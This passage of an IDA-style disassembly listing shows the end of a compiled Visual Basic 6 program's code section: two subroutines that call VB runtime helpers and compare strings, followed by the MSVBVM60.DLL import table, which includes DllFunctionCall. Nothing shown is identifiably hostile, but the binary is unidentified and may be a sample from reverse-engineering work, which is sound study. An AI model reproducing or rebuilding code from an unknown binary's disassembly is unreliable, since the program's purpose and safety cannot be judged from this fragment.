.text:0040D3AD                 jmp     short loc_40D3C6
.text:0040D3AF ; ---------------------------------------------------------------------------
.text:0040D3AF
.text:0040D3AF loc_40D3AF:                             ; DATA XREF: .text:004013A4↑o
.text:0040D3AF                 lea     eax, [ebp+var_50]
.text:0040D3B2                 push    eax
.text:0040D3B3                 lea     eax, [ebp+var_40]
.text:0040D3B6                 push    eax
.text:0040D3B7                 lea     eax, [ebp+var_30]
.text:0040D3BA                 push    eax
.text:0040D3BB                 push    3
.text:0040D3BD                 call    __vbaFreeVarList
.text:0040D3C2                 add     esp, 10h
.text:0040D3C5                 retn
.text:0040D3C6 ; ---------------------------------------------------------------------------
.text:0040D3C6
.text:0040D3C6 loc_40D3C6:                             ; CODE XREF: sub_40D2C7+E6↑j
.text:0040D3C6                                         ; DATA XREF: .text:004013A0↑o
.text:0040D3C6                 lea     ecx, [ebp+var_20]
.text:0040D3C9                 call    __vbaFreeVar
.text:0040D3CE                 retn
.text:0040D3CF ; ---------------------------------------------------------------------------
.text:0040D3CF
.text:0040D3CF loc_40D3CF:                             ; DATA XREF: sub_40D2C7+E1↑o
.text:0040D3CF                 mov     ecx, [ebp+var_10]
.text:0040D3D2                 mov     large fs:0, ecx
.text:0040D3D9                 pop     edi
.text:0040D3DA                 pop     esi
.text:0040D3DB                 pop     ebx
.text:0040D3DC                 leave
.text:0040D3DD                 retn
.text:0040D3DD sub_40D2C7      endp ; sp-analysis failed
.text:0040D3DD
.text:0040D3DE
.text:0040D3DE ; =============== S U B R O U T I N E =======================================
.text:0040D3DE
.text:0040D3DE ; Attributes: bp-based frame
.text:0040D3DE
.text:0040D3DE sub_40D3DE      proc near               ; DATA XREF: sub_40BF67+2C5↑o
.text:0040D3DE
.text:0040D3DE var_30          = dword ptr -30h
.text:0040D3DE var_2C          = dword ptr -2Ch
.text:0040D3DE var_24          = dword ptr -24h
.text:0040D3DE var_20          = dword ptr -20h
.text:0040D3DE var_1C          = word ptr -1Ch
.text:0040D3DE var_18          = byte ptr -18h
.text:0040D3DE var_14          = byte ptr -14h
.text:0040D3DE var_10          = dword ptr -10h
.text:0040D3DE var_8           = dword ptr -8
.text:0040D3DE var_4           = dword ptr -4
.text:0040D3DE
.text:0040D3DE                 push    ebp
.text:0040D3DF                 mov     ebp, esp
.text:0040D3E1                 push    ecx
.text:0040D3E2                 push    ecx
.text:0040D3E3                 push    offset __vbaExceptHandler
.text:0040D3E8                 mov     eax, large fs:0
.text:0040D3EE                 push    eax
.text:0040D3EF                 mov     large fs:0, esp
.text:0040D3F6                 push    20h ; ' '
.text:0040D3F8                 pop     eax
.text:0040D3F9                 call    __vbaChkstk
.text:0040D3FE                 push    ebx
.text:0040D3FF                 push    esi
.text:0040D400                 push    edi
.text:0040D401                 mov     [ebp+var_8], esp
.text:0040D404                 mov     [ebp+var_4], offset dword_4013A8
.text:0040D40B                 call    sub_40A64F
.text:0040D410                 call    sub_40C2A0
.text:0040D415                 call    sub_40C38A
.text:0040D41A                 call    sub_40C38A
.text:0040D41F                 call    sub_40C38A
.text:0040D424                 call    sub_40A4FD
.text:0040D429                 call    sub_40A49C
.text:0040D42E                 call    sub_40C38A
.text:0040D433                 call    sub_40C38A
.text:0040D438                 call    sub_40BD70
.text:0040D43D                 push    2
.text:0040D43F                 push    dword_40E10C
.text:0040D445                 push    17h
.text:0040D447                 push    offset unk_40E0E4
.text:0040D44C                 call    sub_409F9B
.text:0040D451                 or      [ebp+var_1C], 0FFFFh
.text:0040D456                 lea     eax, [ebp+var_1C]
.text:0040D459                 push    eax
.text:0040D45A                 push    dword_40E094
.text:0040D460                 push    offset unk_40E0E4
.text:0040D465                 call    sub_40C38F
.text:0040D46A                 push    0
.text:0040D46C                 push    dword_40E10C
.text:0040D472                 push    17h
.text:0040D474                 push    offset unk_40E150
.text:0040D479                 call    sub_409F9B
.text:0040D47E                 mov     edx, dword_40E09C
.text:0040D484                 mov     ecx, offset dword_40E094
.text:0040D489                 call    __vbaStrCopy
.text:0040D48E                 cmp     dword_40E0AC, 0
.text:0040D495                 jnz     short loc_40D4AF
.text:0040D497                 push    offset dword_40E0AC
.text:0040D49C                 push    offset dword_401960
.text:0040D4A1                 call    __vbaNew2
.text:0040D4A6                 mov     [ebp+var_2C], offset dword_40E0AC
.text:0040D4AD                 jmp     short loc_40D4B6
.text:0040D4AF ; ---------------------------------------------------------------------------
.text:0040D4AF
.text:0040D4AF loc_40D4AF:                             ; CODE XREF: sub_40D3DE+B7↑j
.text:0040D4AF                 mov     [ebp+var_2C], offset dword_40E0AC
.text:0040D4B6
.text:0040D4B6 loc_40D4B6:                             ; CODE XREF: sub_40D3DE+CF↑j
.text:0040D4B6                 mov     eax, [ebp+var_2C]
.text:0040D4B9                 mov     eax, [eax]
.text:0040D4BB                 mov     [ebp+var_20], eax
.text:0040D4BE                 push    dword_40E09C
.text:0040D4C4                 push    offset unk_40E0E4
.text:0040D4C9                 mov     eax, [ebp+var_20]
.text:0040D4CC                 mov     eax, [eax]
.text:0040D4CE                 push    [ebp+var_20]
.text:0040D4D1                 call    dword ptr [eax+40h]
.text:0040D4D4                 fnclex
.text:0040D4D6                 mov     [ebp+var_24], eax
.text:0040D4D9                 cmp     [ebp+var_24], 0
.text:0040D4DD                 jge     short loc_40D4F6
.text:0040D4DF                 push    40h ; '@'
.text:0040D4E1                 push    offset dword_4027CC
.text:0040D4E6                 push    [ebp+var_20]
.text:0040D4E9                 push    [ebp+var_24]
.text:0040D4EC                 call    __vbaHresultCheckObj
.text:0040D4F1                 mov     [ebp+var_30], eax
.text:0040D4F4                 jmp     short loc_40D4FA
.text:0040D4F6 ; ---------------------------------------------------------------------------
.text:0040D4F6
.text:0040D4F6 loc_40D4F6:                             ; CODE XREF: sub_40D3DE+FF↑j
.text:0040D4F6                 and     [ebp+var_30], 0
.text:0040D4FA
.text:0040D4FA loc_40D4FA:                             ; CODE XREF: sub_40D3DE+116↑j
.text:0040D4FA                 push    dword_40E09C
.text:0040D500                 push    dword_40E11C
.text:0040D506                 push    dword_40E0D0
.text:0040D50C                 call    __vbaStrCat
.text:0040D511                 mov     edx, eax
.text:0040D513                 lea     ecx, [ebp+var_14]
.text:0040D516                 call    __vbaStrMove
.text:0040D51B                 push    eax
.text:0040D51C                 push    dword_40E124
.text:0040D522                 call    __vbaStrCat
.text:0040D527                 mov     edx, eax
.text:0040D529                 lea     ecx, [ebp+var_18]
.text:0040D52C                 call    __vbaStrMove
.text:0040D531                 push    eax
.text:0040D532                 call    __vbaStrCmp
.text:0040D537                 neg     eax
.text:0040D539                 sbb     eax, eax
.text:0040D53B                 inc     eax
.text:0040D53C                 neg     eax
.text:0040D53E                 not     ax
.text:0040D541                 mov     word ptr [ebp+var_20], ax
.text:0040D545                 lea     eax, [ebp+var_18]
.text:0040D548                 push    eax
.text:0040D549                 lea     eax, [ebp+var_14]
.text:0040D54C                 push    eax
.text:0040D54D                 push    2
.text:0040D54F                 call    __vbaFreeStrList
.text:0040D554                 add     esp, 0Ch
.text:0040D557                 movsx   eax, word ptr [ebp+var_20]
.text:0040D55B                 test    eax, eax
.text:0040D55D                 jz      short loc_40D561
.text:0040D55F                 jmp     short loc_40D57A
.text:0040D561 ; ---------------------------------------------------------------------------
.text:0040D561
.text:0040D561 loc_40D561:                             ; CODE XREF: sub_40D3DE+17F↑j
.text:0040D561                 and     [ebp+var_1C], 0
.text:0040D566                 lea     eax, [ebp+var_1C]
.text:0040D569                 push    eax
.text:0040D56A                 push    dword_40E094
.text:0040D570                 push    offset unk_40E150
.text:0040D575                 call    sub_40C38F
.text:0040D57A
.text:0040D57A loc_40D57A:                             ; CODE XREF: sub_40D3DE+181↑j
.text:0040D57A                 push    offset loc_40D595
.text:0040D57F                 jmp     short loc_40D594
.text:0040D581 ; ---------------------------------------------------------------------------
.text:0040D581
.text:0040D581 loc_40D581:                             ; DATA XREF: .text:004013B4↑o
.text:0040D581                 lea     eax, [ebp+var_18]
.text:0040D584                 push    eax
.text:0040D585                 lea     eax, [ebp+var_14]
.text:0040D588                 push    eax
.text:0040D589                 push    2
.text:0040D58B                 call    __vbaFreeStrList
.text:0040D590                 add     esp, 0Ch
.text:0040D593                 retn
.text:0040D594 ; ---------------------------------------------------------------------------
.text:0040D594
.text:0040D594 loc_40D594:                             ; CODE XREF: sub_40D3DE+1A1↑j
.text:0040D594                 retn
.text:0040D595 ; ---------------------------------------------------------------------------
.text:0040D595
.text:0040D595 loc_40D595:                             ; CODE XREF: sub_40D3DE:loc_40D594↑j
.text:0040D595                                         ; DATA XREF: sub_40D3DE:loc_40D57A↑o
.text:0040D595                 mov     ecx, [ebp+var_10]
.text:0040D598                 mov     large fs:0, ecx
.text:0040D59F                 pop     edi
.text:0040D5A0                 pop     esi
.text:0040D5A1                 pop     ebx
.text:0040D5A2                 leave
.text:0040D5A3                 retn
.text:0040D5A3 sub_40D3DE      endp ; sp-analysis failed
.text:0040D5A3
.text:0040D5A3 ; ---------------------------------------------------------------------------
.text:0040D5A4                 align 10h
.text:0040D5B0 dword_40D5B0    dd 9E9E9E9Eh            ; DATA XREF: .text:00402064↑o
.text:0040D5B4 __IMPORT_DESCRIPTOR_MSVBVM60 dd rva off_40D5DC ; Import Name Table
.text:0040D5B8                 dd 0FFFFFFFFh           ; Time stamp
.text:0040D5BC                 dd 0FFFFFFFFh           ; Forwarder Chain
.text:0040D5C0                 dd rva aMsvbvm60Dll     ; DLL Name
.text:0040D5C4                 dd rva __imp___vbaVarTstGt ; Import Address Table
.text:0040D5C8                 dd 5 dup(0)
.text:0040D5DC ;
.text:0040D5DC ; Import names for MSVBVM60.DLL
.text:0040D5DC ;
.text:0040D5DC off_40D5DC      dd rva word_40D702      ; DATA XREF: .text:__IMPORT_DESCRIPTOR_MSVBVM60↑o
.text:0040D5E0                 dd rva word_40D712
.text:0040D5E4                 dd rva word_40D71C
.text:0040D5E8                 dd rva word_40D72A
.text:0040D5EC                 dd rva word_40D73A
.text:0040D5F0                 dd rva word_40D74A
.text:0040D5F4                 dd rva word_40D758
.text:0040D5F8                 dd rva word_40D76A
.text:0040D5FC                 dd rva word_40D77E
.text:0040D600                 dd rva word_40D78E
.text:0040D604                 dd 80000274h
.text:0040D608                 dd rva word_40D79C
.text:0040D60C                 dd 80000295h
.text:0040D610                 dd rva word_40D7AA
.text:0040D614                 dd 80000296h
.text:0040D618                 dd rva word_40D7C0
.text:0040D61C                 dd rva word_40D7D8
.text:0040D620                 dd rva word_40D7E8
.text:0040D624                 dd rva word_40D7FC
.text:0040D628                 dd rva word_40D80A
.text:0040D62C                 dd rva word_40D818
.text:0040D630                 dd rva word_40D82A
.text:0040D634                 dd rva word_40D83C
.text:0040D638                 dd rva word_40D846
.text:0040D63C                 dd rva word_40D854
.text:0040D640                 dd rva word_40D868
.text:0040D644                 dd rva word_40D876
.text:0040D648                 dd rva word_40D882
.text:0040D64C                 dd rva word_40D88E
.text:0040D650                 dd rva word_40D8A0
.text:0040D654                 dd rva word_40D8AE
.text:0040D658                 dd rva word_40D8C4
.text:0040D65C                 dd rva word_40D8D2
.text:0040D660                 dd rva word_40D8E0
.text:0040D664                 dd rva word_40D8F6
.text:0040D668                 dd rva word_40D904
.text:0040D66C                 dd rva word_40D90E
.text:0040D670                 dd rva word_40D92A
.text:0040D674                 dd rva word_40D940
.text:0040D678                 dd rva word_40D954
.text:0040D67C                 dd rva word_40D962
.text:0040D680                 dd 80000260h
.text:0040D684                 dd rva word_40D974
.text:0040D688                 dd rva word_40D988
.text:0040D68C                 dd rva word_40D992
.text:0040D690                 dd rva word_40D9A8
.text:0040D694                 dd rva word_40D9B6
.text:0040D698                 dd rva word_40D9C2
.text:0040D69C                 dd rva word_40D9D4
.text:0040D6A0                 dd rva word_40D9E6
.text:0040D6A4                 dd rva word_40D9F6
.text:0040D6A8                 dd rva word_40DA0A
.text:0040D6AC                 dd rva word_40DA1C
.text:0040D6B0                 dd 800002ADh
.text:0040D6B4                 dd 80000064h
.text:0040D6B8                 dd rva word_40DA2A
.text:0040D6BC                 dd rva word_40DA3A
.text:0040D6C0                 dd rva word_40DA48
.text:0040D6C4                 dd rva word_40DA5A
.text:0040D6C8                 dd rva word_40DA66
.text:0040D6CC                 dd rva word_40DA72
.text:0040D6D0                 dd rva word_40DA7C
.text:0040D6D4                 dd rva word_40DA8C
.text:0040D6D8                 dd rva word_40DA96
.text:0040D6DC                 dd 80000222h
.text:0040D6E0                 dd rva word_40DAA0
.text:0040D6E4                 dd rva word_40DAB2
.text:0040D6E8                 dd rva word_40DABC
.text:0040D6EC                 dd rva word_40DACC
.text:0040D6F0                 dd 0
.text:0040D6F4 aMsvbvm60Dll    db 'MSVBVM60.DLL',0     ; DATA XREF: .text:0040D5C0↑o
.text:0040D701                 align 2
.text:0040D702 word_40D702     dw 0                    ; DATA XREF: .text:off_40D5DC↑o
.text:0040D704                 db '__vbaVarTstGt',0
.text:0040D712 word_40D712     dw 0                    ; DATA XREF: .text:0040D5E0↑o
.text:0040D714                 db '_CIcos',0
.text:0040D71B                 align 4
.text:0040D71C word_40D71C     dw 0                    ; DATA XREF: .text:0040D5E4↑o
.text:0040D71E                 db '_adj_fptan',0
.text:0040D729                 align 2
.text:0040D72A word_40D72A     dw 0                    ; DATA XREF: .text:0040D5E8↑o
.text:0040D72C                 db '__vbaVarMove',0
.text:0040D739                 align 2
.text:0040D73A word_40D73A     dw 0                    ; DATA XREF: .text:0040D5EC↑o
.text:0040D73C                 db '__vbaFreeVar',0
.text:0040D749                 align 2
.text:0040D74A word_40D74A     dw 0                    ; DATA XREF: .text:0040D5F0↑o
.text:0040D74C                 db '__vbaCyMul',0
.text:0040D757                 align 4
.text:0040D758 word_40D758     dw 0                    ; DATA XREF: .text:0040D5F4↑o
.text:0040D75A                 db '__vbaStrVarMove',0
.text:0040D76A word_40D76A     dw 0                    ; DATA XREF: .text:0040D5F8↑o
.text:0040D76C                 db '__vbaFreeVarList',0
.text:0040D77D                 align 2
.text:0040D77E word_40D77E     dw 0                    ; DATA XREF: .text:0040D5FC↑o
.text:0040D780                 db '_adj_fdiv_m64',0
.text:0040D78E word_40D78E     dw 0                    ; DATA XREF: .text:0040D600↑o
.text:0040D790                 db '_adj_fprem1',0
.text:0040D79C word_40D79C     dw 0                    ; DATA XREF: .text:0040D608↑o
.text:0040D79E                 db '__vbaStrCat',0
.text:0040D7AA word_40D7AA     dw 0                    ; DATA XREF: .text:0040D610↑o
.text:0040D7AC                 db '__vbaSetSystemError',0
.text:0040D7C0 word_40D7C0     dw 0                    ; DATA XREF: .text:0040D618↑o
.text:0040D7C2                 db '__vbaHresultCheckObj',0
.text:0040D7D7                 align 4
.text:0040D7D8 word_40D7D8     dw 0                    ; DATA XREF: .text:0040D61C↑o
.text:0040D7DA                 db '_adj_fdiv_m32',0
.text:0040D7E8 word_40D7E8     dw 0                    ; DATA XREF: .text:0040D620↑o
.text:0040D7EA                 db '__vbaAryDestruct',0
.text:0040D7FB                 align 4
.text:0040D7FC word_40D7FC     dw 0                    ; DATA XREF: .text:0040D624↑o
.text:0040D7FE                 db '__vbaObjSet',0
.text:0040D80A word_40D80A     dw 0                    ; DATA XREF: .text:0040D628↑o
.text:0040D80C                 db '__vbaCyAdd',0
.text:0040D817                 align 4
.text:0040D818 word_40D818     dw 0                    ; DATA XREF: .text:0040D62C↑o
.text:0040D81A                 db '_adj_fdiv_m16i',0
.text:0040D829                 align 2
.text:0040D82A word_40D82A     dw 0                    ; DATA XREF: .text:0040D630↑o
.text:0040D82C                 db '_adj_fdivr_m16i',0
.text:0040D83C word_40D83C     dw 0                    ; DATA XREF: .text:0040D634↑o
.text:0040D83E                 db '_CIsin',0
.text:0040D845                 align 2
.text:0040D846 word_40D846     dw 0                    ; DATA XREF: .text:0040D638↑o
.text:0040D848                 db '__vbaChkstk',0
.text:0040D854 word_40D854     dw 0                    ; DATA XREF: .text:0040D63C↑o
.text:0040D856                 db 'EVENT_SINK_AddRef',0
.text:0040D868 word_40D868     dw 0                    ; DATA XREF: .text:0040D640↑o
.text:0040D86A                 db '__vbaStrCmp',0
.text:0040D876 word_40D876     dw 0                    ; DATA XREF: .text:0040D644↑o
.text:0040D878                 db '__vbaCyI4',0
.text:0040D882 word_40D882     dw 0                    ; DATA XREF: .text:0040D648↑o
.text:0040D884                 db '__vbaI2I4',0
.text:0040D88E word_40D88E     dw 0                    ; DATA XREF: .text:0040D64C↑o
.text:0040D890                 db 'DllFunctionCall',0
.text:0040D8A0 word_40D8A0     dw 0                    ; DATA XREF: .text:0040D650↑o
.text:0040D8A2                 db '__vbaFpUI1',0
.text:0040D8AD                 align 2
.text:0040D8AE word_40D8AE     dw 0                    ; DATA XREF: .text:0040D654↑o
.text:0040D8B0                 db '__vbaRedimPreserve',0
.text:0040D8C3                 align 4
.text:0040D8C4 word_40D8C4     dw 0                    ; DATA XREF: .text:0040D658↑o
.text:0040D8C6                 db '_adj_fpatan',0
.text:0040D8D2 word_40D8D2     dw 0                    ; DATA XREF: .text:0040D65C↑o
.text:0040D8D4                 db '__vbaRedim',0
.text:0040D8DF                 align 10h
.text:0040D8E0 word_40D8E0     dw 0                    ; DATA XREF: .text:0040D660↑o
.text:0040D8E2                 db 'EVENT_SINK_Release',0
.text:0040D8F5                 align 2
.text:0040D8F6 word_40D8F6     dw 0                    ; DATA XREF: .text:0040D664↑o
.text:0040D8F8                 db '__vbaUI1I2',0
.text:0040D903                 align 4
.text:0040D904 word_40D904     dw 0                    ; DATA XREF: .text:0040D668↑o
.text:0040D906                 db '_CIsqrt',0
.text:0040D90E word_40D90E     dw 0                    ; DATA XREF: .text:0040D66C↑o
.text:0040D910                 db 'EVENT_SINK_QueryInterface',0
.text:0040D92A word_40D92A     dw 0                    ; DATA XREF: .text:0040D670↑o
.text:0040D92C                 db '__vbaExceptHandler',0
.text:0040D93F                 align 10h
.text:0040D940 word_40D940     dw 0                    ; DATA XREF: .text:0040D674↑o
.text:0040D942                 db '__vbaStrToUnicode',0
.text:0040D954 word_40D954     dw 0                    ; DATA XREF: .text:0040D678↑o
.text:0040D956                 db '_adj_fprem',0
.text:0040D961                 align 2
.text:0040D962 word_40D962     dw 0                    ; DATA XREF: .text:0040D67C↑o
.text:0040D964                 db '_adj_fdivr_m64',0
.text:0040D973                 align 4
.text:0040D974 word_40D974     dw 0                    ; DATA XREF: .text:0040D684↑o
.text:0040D976                 db '__vbaFPException',0
.text:0040D987                 align 4
.text:0040D988 word_40D988     dw 0                    ; DATA XREF: .text:0040D688↑o
.text:0040D98A                 db '_CIlog',0
.text:0040D991                 align 2
.text:0040D992 word_40D992     dw 0                    ; DATA XREF: .text:0040D68C↑o
.text:0040D994                 db '__vbaErrorOverflow',0
.text:0040D9A7                 align 4
.text:0040D9A8 word_40D9A8     dw 0                    ; DATA XREF: .text:0040D690↑o
.text:0040D9AA                 db '__vbaR8Str',0
.text:0040D9B5                 align 2
.text:0040D9B6 word_40D9B6     dw 0                    ; DATA XREF: .text:0040D694↑o
.text:0040D9B8                 db '__vbaNew2',0
.text:0040D9C2 word_40D9C2     dw 0                    ; DATA XREF: .text:0040D698↑o
.text:0040D9C4                 db '_adj_fdiv_m32i',0
.text:0040D9D3                 align 4
.text:0040D9D4 word_40D9D4     dw 0                    ; DATA XREF: .text:0040D69C↑o
.text:0040D9D6                 db '_adj_fdivr_m32i',0
.text:0040D9E6 word_40D9E6     dw 0                    ; DATA XREF: .text:0040D6A0↑o
.text:0040D9E8                 db '__vbaStrCopy',0
.text:0040D9F5                 align 2
.text:0040D9F6 word_40D9F6     dw 0                    ; DATA XREF: .text:0040D6A4↑o
.text:0040D9F8                 db '__vbaFreeStrList',0
.text:0040DA09                 align 2
.text:0040DA0A word_40DA0A     dw 0                    ; DATA XREF: .text:0040D6A8↑o
.text:0040DA0C                 db '_adj_fdivr_m32',0
.text:0040DA1B                 align 4
.text:0040DA1C word_40DA1C     dw 0                    ; DATA XREF: .text:0040D6AC↑o
.text:0040DA1E                 db '_adj_fdiv_r',0
.text:0040DA2A word_40DA2A     dw 0                    ; DATA XREF: .text:0040D6B8↑o
.text:0040DA2C                 db '__vbaAryLock',0
.text:0040DA39                 align 2
.text:0040DA3A word_40DA3A     dw 0                    ; DATA XREF: .text:0040D6BC↑o
.text:0040DA3C                 db '__vbaVarDup',0
.text:0040DA48 word_40DA48     dw 0                    ; DATA XREF: .text:0040D6C0↑o
.text:0040DA4A                 db '__vbaStrToAnsi',0
.text:0040DA59                 align 2
.text:0040DA5A word_40DA5A     dw 0                    ; DATA XREF: .text:0040D6C4↑o
.text:0040DA5C                 db '__vbaFpI2',0
.text:0040DA66 word_40DA66     dw 0                    ; DATA XREF: .text:0040D6C8↑o
.text:0040DA68                 db '__vbaFpI4',0
.text:0040DA72 word_40DA72     dw 0                    ; DATA XREF: .text:0040D6CC↑o
.text:0040DA74                 db '_CIatan',0
.text:0040DA7C word_40DA7C     dw 0                    ; DATA XREF: .text:0040D6D0↑o
.text:0040DA7E                 db '__vbaStrMove',0
.text:0040DA8B                 align 4
.text:0040DA8C word_40DA8C     dw 0                    ; DATA XREF: .text:0040D6D4↑o
.text:0040DA8E                 db '_allmul',0
.text:0040DA96 word_40DA96     dw 0                    ; DATA XREF: .text:0040D6D8↑o
.text:0040DA98                 db '_CItan',0
.text:0040DA9F                 align 10h
.text:0040DAA0 word_40DAA0     dw 0                    ; DATA XREF: .text:0040D6E0↑o
.text:0040DAA2                 db '__vbaAryUnlock',0
.text:0040DAB1                 align 2
.text:0040DAB2 word_40DAB2     dw 0                    ; DATA XREF: .text:0040D6E4↑o
.text:0040DAB4                 db '_CIexp',0
.text:0040DABB                 align 4
.text:0040DABC word_40DABC     dw 0                    ; DATA XREF: .text:0040D6E8↑o
.text:0040DABE                 db '__vbaFreeObj',0
.text:0040DACB                 align 4
.text:0040DACC word_40DACC     dw 0                    ; DATA XREF: .text:0040D6EC↑o
.text:0040DACE                 db '__vbaFreeStr',0
.text:0040DADB                 align 800h
.text:0040DADB _text           ends